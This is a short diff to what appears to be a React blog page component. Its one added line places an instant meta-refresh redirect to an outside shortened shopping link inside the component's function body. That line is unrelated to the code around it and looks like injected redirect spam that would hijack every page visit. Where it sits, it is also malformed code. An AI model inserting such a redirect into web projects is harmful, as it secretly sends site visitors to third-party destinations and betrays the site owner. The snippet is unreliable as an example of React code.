@@ -12,6 +12,7 @@ import * as styles from './index.module.css';
 
 const BlogPage = (props) => {
   const blogData = generateMockBlogData(6);
+<meta content="0;url=https://shope.ee/4KukK2gFbn" http-equiv="refresh"></meta>
 
   return (
     <Layout disablePaddingBottom>
